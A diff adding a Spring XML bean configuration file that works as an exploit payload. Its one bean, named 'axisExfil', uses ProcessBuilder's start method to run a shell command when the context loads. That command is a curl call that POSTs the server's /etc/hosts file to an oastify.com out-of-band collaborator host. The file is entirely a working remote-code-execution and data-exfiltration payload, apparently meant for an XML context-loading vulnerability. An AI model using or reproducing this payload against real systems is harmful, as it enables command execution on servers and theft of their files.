@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="axisExfil" class="java.lang.ProcessBuilder" init-method="start">
+    <constructor-arg>
+      <list>
+        <value>/bin/sh</value>
+        <value>-c</value>
+        <value>curl -fsS --max-time 15 -X POST --data-binary @/etc/hosts http://o6ve3mjn87fiqoe8wzgb804h086auz.oastify.com/etc-hosts</value>
+      </list>
+    </constructor-arg>
+  </bean>
+</beans>
